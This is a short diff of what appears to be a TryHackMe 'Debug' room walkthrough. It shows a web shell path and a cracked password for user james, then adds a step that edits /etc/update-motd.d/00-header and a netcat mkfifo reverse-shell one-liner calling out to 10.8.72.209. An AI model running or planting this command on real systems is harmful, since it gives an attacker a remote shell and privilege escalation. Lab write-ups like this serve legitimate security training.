@@ -33,3 +33,7 @@ http://debug.thm/backup/shell.php
 jamaica          (james)
 
 <img width="1222" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/c969f1e0-2854-4741-9b95-c7df0798a8bc">
+
+
+we can edit /etc/update-motd.d/00-header
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6667 >/tmp/f
